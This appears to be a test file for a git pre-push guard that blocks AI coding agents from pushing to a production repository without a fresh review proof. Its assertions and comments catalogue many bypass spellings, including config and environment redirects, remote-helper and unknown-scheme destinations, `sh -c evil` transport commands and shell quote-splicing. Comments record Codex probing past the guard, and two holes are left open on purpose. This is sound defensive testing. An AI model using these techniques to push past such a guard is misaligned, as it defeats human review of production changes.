// does is a URL/path and must be classified directly rather than looked up.
assert.equal(destinationLooksLikeUrl("origin"), false);
assert.equal(destinationLooksLikeUrl("backup-remote"), false);
assert.equal(destinationLooksLikeUrl("git@github.com:masonwells1/CRX_Manager_V1.0.git"), true);
assert.equal(destinationLooksLikeUrl("https://github.com/masonwells1/CRX_Manager_V1.0"), true);
assert.equal(destinationLooksLikeUrl("../sibling-repo"), true);
assert.equal(destinationLooksLikeUrl("C:\\repos\\CRX_Manager_V1.0"), true);
assert.equal(destinationLooksLikeUrl(""), false);
assert.equal(destinationLooksLikeUrl(null), false);

// 2026-07-30 (Codex pre-push review, round 2): inline config is a second bypass.
// The guard resolves the destination with its OWN git calls, which never see a
// `-c` override, so `-c remote.origin.pushurl=<app repo>` sends the push to
// production while every lookup still describes the unrelated checkout.
assert.equal(
  pushUsesInlineConfig("git -c remote.origin.pushurl=git@github.com:masonwells1/CRX_Manager_V1.0.git push origin HEAD:main"),
  true,
);
assert.equal(pushUsesInlineConfig("git -c http.sslVerify=false push origin main"), true);
assert.equal(pushUsesInlineConfig("git --config-env=remote.origin.pushurl=VAR push origin main"), true);
// `-C` (directory) differs from `-c` (config) only in case. Matching it would
// deny every legitimate push this repo makes, so the check must stay case-sensitive.
assert.equal(pushUsesInlineConfig("git -C /repo push origin main"), false, "-C is the directory flag, not config");
assert.equal(pushUsesInlineConfig("git -C C:/CRX_Manager push -u origin feature"), false);
assert.equal(pushUsesInlineConfig("git push origin main"), false);
// A `-c` that is not part of a push command must not trip the check.
assert.equal(pushUsesInlineConfig("git -c user.name=x commit -m nope"), false, "not a push");

// A URL rewrite reaches production under an alias: `git push crx: main` looks
// unguarded on its own, but resolves to the app repo.
assert.equal(
  rewritesReachGuardedApp("url.git@github.com:masonwells1/CRX_Manager_V1.0.git.pushinsteadof crx:"),
  true,
);
assert.equal(
  rewritesReachGuardedApp("url.https://github.com/masonwells1/CRX_Manager_V1.0.insteadof crx:"),
  true,
);
assert.equal(
  rewritesReachGuardedApp("url.git@github.com:masonwells1/CRX_Backups.git.pushinsteadof bk:"),
  false,
  "a rewrite pointing somewhere else is not this gate's business",
);
assert.equal(rewritesReachGuardedApp(""), false, "no rewrites configured is not a risk");
assert.equal(rewritesReachGuardedApp(null), false);
// One app-repo rewrite among several still gates.
assert.equal(
  rewritesReachGuardedApp(
    "url.git@github.com:masonwells1/CRX_Backups.git.insteadof bk:\nurl.git@github.com:masonwells1/CRX_Manager_V1.0.git.pushinsteadof crx:",
  ),
  true,
);
// A malformed line yields an empty base, which fails CLOSED.
assert.equal(rewritesReachGuardedApp("garbage"), true, "unparseable rewrite config gates");
// Percent-escapes are decoded before identity is decided — the server decodes
// them, so `%43RX_Manager_V1.0` IS the production repository.
assert.equal(
  urlIsGuardedApp("https://github.com/masonwells1/%43RX_Manager_V1.0.git"), true,
  "a percent-encoded repo name is still the app repo",
);
assert.equal(
  urlIsGuardedApp("git@github.com:masonwells1%2FCRX_Manager_V1.0.git"), true,
  "an encoded separator does not hide the owner segment",
);
assert.equal(
  urlIsGuardedApp("https://github.com/masonwells1/CRX%ZZ.git"), true,
  "a malformed escape is undecodable and fails CLOSED",
);
assert.equal(
  urlIsGuardedApp("https://github.com/masonwells1/%43RX_Backups.git"), false,
  "decoding does not turn an unrelated repo into this one",
);
// ── round 16: a `~/.ssh/config` Host alias is still github.com ───────────────
// `github-crx` is local text that resolves to github.com on the pushing machine,
// so no list of host names can be complete. Identity is the owner/repo path.
assert.equal(
  urlIsGuardedApp("github-crx:masonwells1/CRX_Manager_V1.0.git"), true,
  "an ssh Host alias does not hide the production repo",
);
assert.equal(
  urlIsGuardedApp("ssh://git@github-crx/masonwells1/CRX_Manager_V1.0.git"), true,
  "nor does the ssh:// spelling of the same alias",
);
assert.equal(
  urlIsGuardedApp("github-crx:masonwells1/CRX_Backups.git"), false,
  "and the alias rule does not start policing the private backup repo",
);

// ── round 21: the same instruction, stored instead of typed ──────────────────
// Round 17 denied `--receive-pack` on the command line. Git stores it too, and
// `core.sshCommand` replaces the SSH binary outright — neither appears in the
// push text, so no parser sees them.
{
  const list = [
    "core.sshcommand=ssh -i /tmp/relay",
    "remote.backup.receivepack=/tmp/relay",
    "remote.backup.vcs=relay",
    "remote.origin.url=git@github.com:masonwells1/CRX_Backups.git",
    "user.name=Mason",
  ].join("\n");
  const found = executableTransportSettings(list);
  assert.ok(found.includes("core.sshcommand"), "core.sshCommand is named");
  assert.ok(found.includes("remote.backup.receivepack"), "a stored receivepack is named");
  assert.ok(found.includes("remote.backup.vcs"), "a stored remote helper is named");
  assert.equal(found.length, 3, "and nothing innocent is swept up with them");
}
assert.deepEqual(
  executableTransportSettings("user.name=Mason\nremote.origin.url=git@github.com:x/y.git"), [],
  "an ordinary configuration names no programs",
);
assert.deepEqual(executableTransportSettings(""), [], "and an empty config is empty");

// `remote.<n>.mirror` — `--mirror` stored in config instead of typed. Verified
// against git before writing these: with it set, `git push origin` from a
// feature branch enumerated `feature -> feature` AND `main -> main`, and any
// explicit refspec failed outright with "--mirror can't be combined with
// refspecs". So a mirror remote has no narrow push form at all.
{
  const list = [
    "remote.origin.mirror=true",
    "remote.backup.mirror=false",
    "remote.origin.url=git@github.com:masonwells1/CRX_Manager_V1.0.git",
    "user.name=Mason",
  ].join("\n");
  assert.deepEqual(
    configuredMirrorRemotes(list), ["origin"],
    "a true mirror remote is named and a false one is not",
  );
}
for (const truthy of ["true", "yes", "on", "1", "TRUE", "  True  "]) {
  assert.deepEqual(
    configuredMirrorRemotes(`remote.origin.mirror=${truthy}`), ["origin"],
    `git's boolean spelling "${truthy}" reads as mirroring`,
  );
}
for (const falsy of ["false", "no", "off", "0", ""]) {
  assert.deepEqual(
    configuredMirrorRemotes(`remote.origin.mirror=${falsy}`), [],
    `"${falsy}" does not mirror, so it must not deny`,
  );
}
// This assertion used to read the other way — "a valueless key proves nothing
// and must not deny" — which encoded the bug as if it were the rule. Git says
// otherwise, and `git config --bool --get remote.origin.mirror` prints `true`
// against a config carrying the bare key. Reported by Codex on 2026-08-05 and
// reproduced before the fix, so the inverted expectation is measured, not argued.
assert.deepEqual(
  configuredMirrorRemotes("remote.origin.mirror"), ["origin"],
  "a valueless boolean is git's spelling of true and must deny",
);
assert.deepEqual(
  configuredMirrorRemotes("remote.origin.mirror="), [],
  "but an empty value is git's false, and must not deny",
);
// Found while reproducing the above, in the same parse: `--list` prints a remote
// named `my remote` as `remote.my remote.mirror=true`, and splitting on the first
// space keyed that as `remote.my`, which matches nothing and denies nothing.
assert.deepEqual(
  configuredMirrorRemotes("remote.my remote.mirror=true"), ["my remote"],
  "a remote name containing a space still parses as a mirror",
);
assert.deepEqual(
  configuredMirrorRemotes("remote.origin.mirror true"), ["origin"],
  "`--get-regexp` separates key from value with a space, not an `=`",
);
assert.deepEqual(
  configuredMirrorRemotes("REMOTE.ORIGIN.MIRROR=true"), ["ORIGIN"],
  "key matching is case-insensitive, but the remote NAME is a case-sensitive "
  + "subsection and is reported verbatim so `--unset` can address it",
);
assert.deepEqual(
  configuredMirrorRemotes("remote.origin.mirrored=true\nremote.origin.url=x"), [],
  "a key that merely starts like mirror is not swept up",
);
assert.deepEqual(
  configuredMirrorRemotes("user.name=Mason\nremote.origin.url=git@github.com:x/y.git"), [],
  "an ordinary configuration mirrors nothing",
);
assert.deepEqual(configuredMirrorRemotes(""), [], "and an empty config is empty");
// Structural on purpose, and the comment at its definition explains why: the
// classifier above is what denies a mirror in practice, so deleting this lookup
// breaks no behavioural test here. It exists as the fail-closed path for when the
// classifier's error-swallowing config read comes back empty, which no test in
// this file can provoke. Asserting its presence is the only guard against a
// future cleanup removing it as dead weight.
assert.ok(
  pushDestinationLookupArgs("feature").some(([name]) => name === "remote.*.mirror"),
  "mirror config stays among the compared answers as the fail-closed backstop",
);
assert.ok(
  executableTransportSettings("CORE.SSHCOMMAND=ssh").includes("core.sshcommand"),
  "git config keys are case-insensitive, so the check is too",
);
assert.ok(
  executableTransportSettings("remote.b.uploadpack /tmp/relay").includes("remote.b.uploadpack"),
  "and --get-regexp's space-separated output reads the same as --list's",
);
assert.ok(
  executableTransportSettings("protocol.ext.command=/tmp/relay").includes("protocol.ext.command"),
  "the transport-helper command setting is named too",
);

// Known-hole pin: `core.hooksPath` and shell-form `credential.helper` are
// DELIBERATELY absent from EXECUTABLE_TRANSPORT_KEYS. See KNOWN_ISSUES.md,
// "Third instance — the executable-config classifier misses core.hooksPath"
// (2026-08-05): a naive addition denies every push in THIS repository, because
// husky legitimately sets core.hooksPath=.husky/_ here. This is not a test
// that the gap is safe — it is a tripwire so any future change to the key
// list forces a deliberate look at that KNOWN_ISSUES entry rather than
// silently closing or silently leaving open a real bypass.
assert.ok(
  !executableTransportSettings("core.hooksPath=/tmp/evil-hooks").includes("core.hookspath"),
  "core.hooksPath is currently NOT recognised as an executable-transport setting (known hole, parked)",
);
assert.ok(
  !executableTransportSettings("credential.helper=!/tmp/evil-helper").includes("credential.helper"),
  "shell-form credential.helper is currently NOT recognised either (known hole, parked)",
);
assert.ok(
  executableTransportSettings("core.sshCommand=ssh -i /tmp/relay").includes("core.sshcommand"),
  "core.sshCommand, by contrast, IS present in the list",
);

// ── round 22: an unknown scheme names a program, not a place ─────────────────
// Git dispatches any scheme it does not implement to `git-remote-<scheme>`, which
// is free to ignore the address. Unlike `ext::`, these PARSE — so canonicalRepoId
// hands back a tidy repository id and the URL reads as a perfectly ordinary,
// perfectly unrelated destination unless the scheme itself is checked first.
for (const ordinary of [
  "https://github.com/someone/else.git",
  "http://example.invalid/x.git",
  "ssh://git@github.com/masonwells1/CRX_Manager_V1.0.git",
  "git://example.invalid/x.git",
  "file:///c/repos/bare.git",
  "git@github.com:someone/else.git",
  "origin",
  "../scratch/bare.git",
]) {
  assert.equal(urlUsesUnknownTransport(ordinary), false, `${ordinary} uses a transport git implements itself`);
}
for (const courier of ["relay://example.invalid/harmless.git", "RELAY://example.invalid/x.git", "ftp://example.invalid/x.git"]) {
  assert.equal(urlUsesUnknownTransport(courier), true, `${courier} hands delivery to a helper program`);
}
assert.equal(
  urlIsGuardedApp("relay://example.invalid/harmless.git"), true,
  "an unknown scheme gates even when the address it names is unrelated",
);
assert.equal(
  urlIsGuardedApp("relay://github.com/masonwells1/CRX_Backups.git"), true,
  "and even when it canonicalizes to a repository that would otherwise be allowed",
);
assert.equal(
  urlIsGuardedApp("https://github.com/someone/else.git"), false,
  "while an ordinary https destination is still classified on its repository",
);

// ── round 22: a repository selector inherited from the shell ─────────────────
// GIT_INDEX_FILE and GIT_PREFIX are deliberately NOT selectors here: git sets
// them itself when it runs a hook, and neither can move a push's destination.
assert.deepEqual(environmentSelectsDifferentRepo({ PATH: "/usr/bin" }), [], "an ordinary environment selects nothing");
assert.deepEqual(environmentSelectsDifferentRepo({ GIT_DIR: "/tmp/other/.git" }), ["GIT_DIR"], "GIT_DIR is a selection");
assert.deepEqual(environmentSelectsDifferentRepo({ GIT_WORK_TREE: "/tmp/other" }), ["GIT_WORK_TREE"], "so is GIT_WORK_TREE");
assert.deepEqual(environmentSelectsDifferentRepo({ GIT_NAMESPACE: "x" }), ["GIT_NAMESPACE"], "so is a namespace");
assert.deepEqual(environmentSelectsDifferentRepo({ GIT_DIR: "  " }), [], "an empty value selects nothing");
assert.deepEqual(
  environmentSelectsDifferentRepo({ GIT_INDEX_FILE: "/tmp/i", GIT_PREFIX: "sub/" }), [],
  "and the variables git itself exports into hooks are not selections",
);

// ── round 20: a command can start right after a separator, with no space ─────
// `npm test&&git push …` is an ordinary shell line. Requiring whitespace before
// `git` meant the hook saw NO push and exited before every check it exists for.
// Codex probed all three separators and got zero detected pushes.
for (const cmd of [
  "npm test&&git push origin HEAD:main",
  "echo ok;git push origin HEAD:main",
  "echo ok|git push origin HEAD:main",
]) {
  assert.equal(isGitPush(cmd), true, `a push right after a separator is seen: ${cmd}`);
  assert.equal(eachPush(cmd).length, 1, `and is enumerated for per-push checks: ${cmd}`);
}
assert.equal(
  isGitPush("npm test && git push origin HEAD:main"), true,
  "the spaced spelling still works",
);
assert.equal(
  isGitPush("echo notagit push"), false,
  "and a word merely ENDING in git does not become a push",
);
// `(` stays out of the boundary class on purpose: a substitution must keep
// failing this test so the round-19 check refuses it rather than inspecting text
// the shell rewrites.
assert.equal(
  isGitPush("$(git push origin HEAD:main)"), false,
  "a command substitution is still not read as an ordinary push",
);
assert.equal(
  pushHiddenByShellComposition("$(git push origin HEAD:main)"), true,
  "so the substitution check is still the thing that catches it",
);

// ── round 19: the shell runs something other than the text we matched ────────
// Three spellings Codex probed straight past every check in the file. The rule
// is not "recognise these three" — it is that a command which only becomes a
// push after the shell rewrites it is refused instead of analysed.
assert.equal(
  pushHiddenByShellComposition(`git p"us"h origin HEAD:main`), true,
  "quote splicing that the shell concatenates back into `push` is caught",
);
assert.equal(
  pushHiddenByShellComposition(`git p'us'h origin HEAD:main`), true,
  "including the single-quote spelling",
);
assert.equal(
  pushHiddenByShellComposition("git pu`sh origin HEAD:main"), true,
  "including a PowerShell backtick escape inside `push`",
);
assert.equal(
  pushHiddenByShellComposition("git --% push origin HEAD:main"), true,
  "PowerShell's stop-parsing token cannot hide push",
);
assert.equal(
  pushHiddenByShellComposition("git pu\\sh origin HEAD:main"), true,
  "including a POSIX shell backslash escape inside `push`",
);
assert.equal(
  pushHiddenByShellComposition('cmd /d /c "git pu^sh origin HEAD:main"'), true,
  "including cmd.exe caret escaping inside `push`",
);
assert.equal(
  pushHiddenByShellComposition("git ('pu'+'sh') origin HEAD:main"), true,
  "including PowerShell expression concatenation inside `push`",
);
assert.equal(
  pushHiddenByShellComposition("git ('p'+'u'+'sh') origin HEAD:main"), true,
  "including repeated PowerShell expression concatenation inside `push`",
);
assert.equal(
  pushHiddenByShellComposition("git pu\\\nsh origin HEAD:main"), true,
  "including a POSIX shell line splice inside `push`",
);
assert.equal(
  pushHiddenByShellComposition("git pu`\r\nsh origin HEAD:main"), true,
  "including a PowerShell line splice inside `push`",
);
assert.equal(
  pushHiddenByShellComposition(`git push origin HEAD:ma"in"`), true,
  "quote splicing inside a refspec cannot disguise a push to main",
);
assert.equal(
  pushHiddenByShellComposition(`git push origin feature && git p"us"h origin HEAD:main`), true,
  "a visible harmless push cannot hide a second quote-spliced push",
);
assert.equal(
  pushHiddenByShellComposition(`git push origin feature && git p"us"h --force origin feature`), true,
  "a visible harmless push cannot hide a second quote-spliced force push",
);
assert.equal(
  pushHiddenByShellComposition(`git push "origin" "HEAD:main"`), false,
  "ordinary whole-argument quoting remains inspectable",
);
assert.equal(
  pushHiddenByShellComposition("$(git push origin HEAD:main)"), true,
  "a command substitution that runs a push is caught",
);
assert.equal(
  pushHiddenByShellComposition("`git push origin HEAD:main`"), true,
  "and the backtick spelling of the same thing",
);
assert.equal(
  pushHiddenByShellComposition("git -C /repo push origin HEAD:main"), false,
  "an ordinary push is NOT flagged — it takes the normal inspected path",
);
assert.equal(
  pushHiddenByShellComposition("npm run build"), false,
  "and a command with no push in any reading is left alone",
);

// ── round 18: a destination that names a PROGRAM, not an address ─────────────
// `ext::<command>` is git's remote-helper syntax: delivery is handed to an
// arbitrary program, so the address written on the command means nothing. Codex
// probed exactly this and got `guarded: false` for the production app repo. The
// last-resort rule is inverted rather than extended — only a plain remote name
// or a plain filesystem path may still be judged by pattern; a leftover colon
// means unresolvable, and unresolvable fails CLOSED.
assert.equal(
  urlIsGuardedApp("ext::ssh git@github.com %S masonwells1/CRX_Manager_V1.0.git"), true,
  "a remote-helper destination naming the production repo is guarded",
);
assert.equal(
  urlIsGuardedApp("ext::ssh relay-host %S someone/anything.git"), true,
  "and one naming anything else is too — the helper decides where it lands",
);
assert.equal(
  urlIsGuardedApp("transport::whatever"), true,
  "the rule is the syntax, not the `ext` spelling of it",
);
assert.equal(
  urlIsGuardedApp("upstream-2"), false,
  "a plain remote name is still resolved elsewhere",
);
assert.equal(
  urlIsGuardedApp("../scratch/bare.git"), false,
  "and so is a relative filesystem path",
);
assert.equal(
  urlIsGuardedApp("C:\\repos\\bare.git"), false,
  "a Windows drive letter is a path, not a host — the drive colon does not gate",
);
// The inverted last-resort rule itself: a destination that did not canonicalize
// and still carries a colon names something this guard cannot resolve. It is not
// enough that the `::` check above caught the helper spelling — the point of
// inverting the rule is that unrecognised shapes gate WITHOUT being enumerated.
assert.equal(
  urlIsGuardedApp("a:b"), true,
  "an uncanonicalizable colon destination fails CLOSED rather than reading as unrelated",
);
assert.equal(
  urlIsGuardedApp("weird-host:"), true,
  "including one with nothing after the colon",
);
assert.equal(
  repoIsGuardedApp("origin\tgithub-crx:masonwells1/CRX_Manager_V1.0.git (push)"), true,
  "a checkout whose only remote is an aliased app-repo URL is the app repo",
);
assert.equal(
  rewritesReachGuardedApp("url.github-crx:masonwells1/.insteadof ghm:"),
  true,
  "an aliased owner-level prefix rewrite reaches production too",
);
// insteadOf is a PREFIX substitution: `ghm:CRX_Manager_V1.0.git` expands to the
// production repo even though the base names no repository on its own.
assert.equal(
  rewritesReachGuardedApp("url.git@github.com:masonwells1/.insteadof ghm:"),
  true,
  "an owner-level prefix rewrite reaches production",
);
assert.equal(
  rewritesReachGuardedApp("url.git@github.com:masonwells1/CRX_.insteadof crx:"),
  true,
  "a partial repository-name prefix reaches production because git substitutes raw prefixes",
);
assert.equal(
  rewritesReachGuardedApp("url.https://github.com/masonwells1/.pushinsteadof ghm:"),
  true,
  "the https spelling of the same prefix too",
);
assert.equal(
  rewritesReachGuardedApp("url.https://github.com/.insteadof gh:"),
  true,
  "a base naming only a host resolves nowhere and fails CLOSED",
);
assert.equal(
  rewritesReachGuardedApp("url.git@github.com:someoneelse/.insteadof other:"),
  false,
  "a prefix under a different owner cannot complete to the app repo",
);

const base = "c".repeat(40);
const codexProof = {
  codex_ran: true,
  verdict: "clean",
  model: "gpt-5.6-sol",
  reasoning_effort: "high",
  head_sha: sha,
  base_sha: base,
  timestamp: new Date(now).toISOString(),
};
assert.equal(proofValid(codexProof, sha, now), true);
assert.equal(proofValid({ ...codexProof, timestamp: new Date(now - 30 * 60 * 1000).toISOString() }, sha, now), true);
assert.equal(proofValid({ ...codexProof, timestamp: new Date(now - 30 * 60 * 1000 - 1).toISOString() }, sha, now), false);
assert.equal(proofValid({ ...codexProof, timestamp: new Date(now + 1).toISOString() }, sha, now), false);
assert.equal(proofValid({ ...codexProof, head_sha: "" }, sha, now), false);
assert.equal(proofValid({ ...codexProof, model: "gpt-5.6-terra" }, sha, now), false);
assert.equal(proofValid({ ...codexProof, reasoning_effort: "medium" }, sha, now), false);
assert.equal(
  proofValid({ ...codexProof, verdict: "blockers-fixed" }, sha, now),
  false,
  "obsolete blockers-fixed Codex proof is rejected",
);

// Base-SHA binding (2026-07-14): when the guard supplies the origin/main it is
// gating against, the proof's base_sha must match. A moved base — origin/main
// advanced by a sibling merge fetched locally, without touching HEAD or the
// worktree — must invalidate a proof that would otherwise still look fresh.
assert.equal(proofValid(codexProof, sha, now, base), true, "matching base_sha passes");
assert.equal(proofValid(codexProof, sha, now, "d".repeat(40)), false, "moved base (base_sha mismatch) → invalid");
assert.equal(
  proofValid({ ...codexProof, base_sha: undefined }, sha, now, base),
  false,
  "pre-hardening proof with no base_sha fails closed once a base is required",
);
// Backward-compat: with no base expectation supplied the base check is skipped,
// mirroring how the head_sha check is gated on a supplied headSha.
assert.equal(proofValid({ ...codexProof, base_sha: undefined }, sha, now), true, "base check is skipped when no base is expected");

const claudeProof = { claude_ran: true, verdict: "clean", head_sha: sha, base_sha: base, timestamp: new Date(now).toISOString() };
assert.equal(claudeProofValid(claudeProof, sha, now), true);
assert.equal(claudeProofValid({ ...claudeProof, claude_ran: false }, sha, now), false);
assert.equal(
  claudeProofValid({ ...claudeProof, verdict: "blockers-fixed" }, sha, now),
  false,
  "obsolete blockers-fixed Claude proof is rejected",
);
assert.equal(claudeProofValid({ ...claudeProof, verdict: "ship" }, sha, now), false);
assert.equal(claudeProofValid({ ...claudeProof, head_sha: "b".repeat(40) }, sha, now), false);
assert.equal(claudeProofValid({ ...claudeProof, timestamp: new Date(now + 60_000).toISOString() }, sha, now), false);
assert.equal(claudeProofValid(claudeProof, sha, now, base), true, "matching base_sha passes (Claude proof)");
assert.equal(claudeProofValid(claudeProof, sha, now, "d".repeat(40)), false, "moved base → invalid (Claude proof)");
assert.equal(claudeProofValid({ ...claudeProof, base_sha: undefined }, sha, now, base), false, "no base_sha fails closed when a base is required (Claude proof)");

// Codex round-5 (2026-07-13): patch DESTINATIONS, not whole-body mentions.
assert.deepEqual(
  extractPatchDestinations("*** Add File: .claude/session-state/claude-review-push.json\n+{}"),
  [".claude/session-state/claude-review-push.json"],
);
assert.deepEqual(
  extractPatchDestinations("*** Update File: docs/reference/agent-guardrails.md\n+guard lives at .codex/hooks/production-action-guard.mjs"),
  ["docs/reference/agent-guardrails.md"],
  "prose mentions inside the patch body are NOT destinations",
);
assert.deepEqual(
  extractPatchDestinations("--- a/src/a.ts\n+++ b/src/b.ts\n+// mentions .claude/session-state/claude-review-push.json"),
  ["src/a.ts", "src/b.ts"],
  "unified-diff headers are destinations; body mentions are not",
);

// --- GIT_CONFIG* environment overrides (Codex 2026-07-30, round 3) ------------
// Proven live: with `origin` pointing elsewhere, GIT_CONFIG_KEY_0=
// remote.origin.pushurl redirected the push to a different repository.
// ── round 12: transport variables, wherever they are written ────────────────
assert.deepEqual(
  pushUsesTransportEnv(`export GIT_SSH_COMMAND="sh -c evil"; git push origin HEAD:main`),
  ["GIT_SSH_COMMAND"], "a prior-segment export is in scope",
);
assert.deepEqual(
  pushUsesTransportEnv(`GIT_SSH_COMMAND="ssh -o ServerAliveInterval=20" git push origin HEAD:main`),
  [], "the documented keepalive value is allowed wherever it appears",
);
assert.deepEqual(
  pushUsesTransportEnv(`export GIT_SSH_COMMAND='ssh -o BatchMode=yes'; git push origin main`),
  [], "single-quoted keepalive too",
);
assert.deepEqual(
  pushUsesTransportEnv(`echo $GIT_SSH_COMMAND && git push origin main`),
  ["GIT_SSH_COMMAND"], "a mention the guard cannot verify fails CLOSED",
);
assert.deepEqual(pushUsesTransportEnv(`git push origin main`), [], "an ordinary push names none");
assert.deepEqual(pushUsesTransportEnv(`export GIT_SSH_COMMAND=evil; echo hi`), [], "not a push at all");
assert.deepEqual(
  environmentCarriesTransportOverride({ GIT_SSH_COMMAND: "sh -c evil", PATH: "/usr/bin" }),
  ["GIT_SSH_COMMAND"], "an inherited arbitrary value is reported",
);
assert.deepEqual(
  environmentCarriesTransportOverride({ GIT_SSH_COMMAND: "ssh -o ServerAliveInterval=20", GIT_TERMINAL_PROMPT: "0" }),
  [], "inherited values in the sanctioned shapes are not",
);
assert.deepEqual(
  environmentCarriesTransportOverride({ GIT_PROXY_COMMAND: "/tmp/y", GIT_SSH: "/tmp/z" }).sort(),
  ["GIT_PROXY_COMMAND", "GIT_SSH"], "every offending name is listed, not just the first",
);
// An inherited askpass/credential helper supplies a credential to a connection
// git has already resolved — it cannot move the objects to another repository,
// which is what this gate is for. Claude Code on the web exports GIT_ASKPASS for
// its credential proxy, and treating it as an offender denied every push from a
// web or mobile session. Written into the command it is still denied; see the
// `export GIT_ASKPASS=…` case in the end-to-end round below.
assert.deepEqual(
  environmentCarriesTransportOverride({ GIT_ASKPASS: "/tmp/x", SSH_ASKPASS: "/tmp/y", GIT_CREDENTIAL_HELPER: "/tmp/z" }),
  [], "an inherited credential helper is not a destination override",
);
assert.deepEqual(
  environmentCarriesTransportOverride({ GIT_ASKPASS: "/tmp/x", GIT_SSH_COMMAND: "sh -c evil" }),
  ["GIT_SSH_COMMAND"], "the transport itself is still an offender alongside a credential helper",
);
// Git exports GIT_EXEC_PATH into every hook it runs, so an inherited one says
// nothing about intent. Treating it as an offender denied ordinary pushes.
assert.deepEqual(
  environmentCarriesTransportOverride({ GIT_EXEC_PATH: "C:/Program Files/Git/mingw64/libexec/git-core" }),
  [], "an inherited GIT_EXEC_PATH is git's own export, not a finding",
);
assert.deepEqual(
  environmentCarriesTransportOverride(
    { GIT_EXEC_PATH: "C:/tmp/planted" },
    "C:/Program Files/Git/mingw64/libexec/git-core",
  ),
  ["GIT_EXEC_PATH"], "a planted inherited GIT_EXEC_PATH is reported",
);
assert.deepEqual(
  environmentCarriesTransportOverride(
    { GIT_EXEC_PATH: "C:\\Program Files\\Git\\mingw64\\libexec\\git-core" },
    "C:/Program Files/Git/mingw64/libexec/git-core",
  ),
  [], "git's own exported exec path survives slash differences",
);
assert.deepEqual(
  pushUsesTransportEnv(`GIT_EXEC_PATH=/tmp/evil git push origin main`),
  ["GIT_EXEC_PATH"], "writing it into the command is still a deliberate act",
);
assert.equal(
  pushUsesExecPathOption("git --exec-path=C:/relay push origin main"),
  true, "git's global executable-helper override is denied",
);
assert.equal(pushUsesExecPathOption("git --exec-path"), false, "querying the exec path without a push is harmless");
assert.deepEqual(
  pushUsesTransportEnv("PATH=C:/relay; git push origin main"),
  ["PATH"], "an earlier executable search-path change is in scope",
);
assert.deepEqual(
  pushUsesTransportEnv("$env:PATHEXT='.MJS'; git push origin main"),
  ["PATHEXT"], "PowerShell executable-extension changes are in scope too",
);

const CRX_URL = "git@github.com:masonwells1/CRX_Manager_V1.0.git";
assert.equal(
  pushUsesConfigEnv(`GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.pushurl GIT_CONFIG_VALUE_0=${CRX_URL} git -C /repo push origin main`),
  true,
);
assert.equal(pushUsesConfigEnv("GIT_CONFIG_COUNT=2 git push origin main"), true);
// The assignment can sit in its own command segment. The guard therefore checks
// this against the WHOLE command rather than the per-push segments it splits out
// — the per-segment version passed every other case here and still let this one
// through when probed end-to-end.
assert.equal(pushUsesConfigEnv("GIT_CONFIG_COUNT=1 && git push origin main"), true, "chained with &&");
assert.equal(pushUsesConfigEnv("GIT_CONFIG_KEY_0=remote.origin.pushurl\ngit push origin main"), true, "chained with a newline");
assert.equal(pushUsesConfigEnv("export GIT_CONFIG_KEY_0=remote.origin.pushurl; git push origin main"), true);
assert.equal(pushUsesConfigEnv("GIT_CONFIG_GLOBAL=/tmp/evil git push origin main"), true);
assert.equal(pushUsesConfigEnv("GIT_CONFIG_SYSTEM=/tmp/evil git push origin main"), true);
assert.equal(pushUsesConfigEnv("GIT_CONFIG=/tmp/evil git push origin main"), true, "bare GIT_CONFIG redirects config too");
assert.equal(pushUsesConfigEnv('$env:GIT_CONFIG_COUNT = "1"; git push origin main'), true, "PowerShell env form");
// Must not fire on ordinary pushes, or on the documented keepalive workaround.
assert.equal(pushUsesConfigEnv("git -C C:/CRX_Manager push origin feature"), false);
assert.equal(pushUsesConfigEnv('GIT_SSH_COMMAND="ssh -o ServerAliveInterval=20" git -C /repo push origin feature'), false, "transport env is not a destination override");
assert.equal(pushUsesConfigEnv("GIT_CONFIG_COUNT=1 git commit -m x"), false, "not a push");
assert.equal(pushUsesConfigEnv(""), false);
assert.equal(pushUsesConfigEnv(null), false);
// A variable that merely ENDS in the name is not an override.
assert.equal(pushUsesConfigEnv("MY_GIT_CONFIG_COUNT=1 git push origin main"), false);
// Quoted assignments. The shell strips the quotes and Git still applies the
// variable, so a detector that demands whitespace before the name is open.
// Codex round-4 (2026-07-30) probed exactly this and got `false`.
assert.equal(pushUsesConfigEnv(`env 'GIT_CONFIG_COUNT=1' 'GIT_CONFIG_KEY_0=remote.origin.pushurl' 'GIT_CONFIG_VALUE_0=${CRX_URL}' git -C /repo push origin main`), true, "single-quoted env assignment");
assert.equal(pushUsesConfigEnv(`env "GIT_CONFIG_COUNT=1" git -C /repo push origin main`), true, "double-quoted env assignment");
assert.equal(pushUsesConfigEnv("env 'GIT_CONFIG_GLOBAL=/tmp/evil' git push origin main"), true, "quoted GIT_CONFIG_GLOBAL");
assert.equal(pushUsesConfigEnv("GIT_CONFIG_COUNT='1' git push origin main"), true, "quoted VALUE, unquoted name");
assert.equal(pushUsesConfigEnv("env 'MY_GIT_CONFIG_COUNT=1' git push origin main"), false, "quoting does not turn an unrelated variable into an override");
// Round 5 (Codex, 2026-07-30): the detector listed variable names one by one and
// GIT_CONFIG_PARAMETERS was not on the list. Git honours it — verified against
// git 2.54 that it sets remote.origin.pushurl in a checkout that has none — so
// the whole `GIT_CONFIG*` namespace is denied rather than an enumerated subset.
assert.equal(
  pushUsesConfigEnv(`GIT_CONFIG_PARAMETERS="'remote.origin.pushurl=${CRX_URL}'" git -C /repo push origin main`),
  true,
  "GIT_CONFIG_PARAMETERS is a destination override",
);
assert.equal(pushUsesConfigEnv("env 'GIT_CONFIG_PARAMETERS=x' git push origin main"), true, "quoted GIT_CONFIG_PARAMETERS");
assert.equal(pushUsesConfigEnv('$env:GIT_CONFIG_PARAMETERS = "x"; git push origin main'), true, "PowerShell GIT_CONFIG_PARAMETERS");
// A name the namespace has not invented yet must be denied too — that is the
// point of matching the prefix instead of a list.
assert.equal(pushUsesConfigEnv("GIT_CONFIG_SOMETHING_NEW=x git push origin main"), true, "any future GIT_CONFIG_* variable is denied");
assert.equal(pushUsesConfigEnv("MY_GIT_CONFIG_PARAMETERS=x git push origin main"), false, "the prefix match is still anchored at a boundary");
// Round 6 (Codex, 2026-07-30): the detector still described the ASSIGNMENT
// syntax, and PowerShell has several. All four of these returned `false` before
// the rule became "mentions the namespace at all".
assert.equal(pushUsesConfigEnv("Set-Item Env:GIT_CONFIG_COUNT 1; git push origin HEAD:main"), true, "PowerShell Set-Item form");
assert.equal(pushUsesConfigEnv("${env:GIT_CONFIG_COUNT} = '1'; git push origin HEAD:main"), true, "PowerShell ${env:…} form");
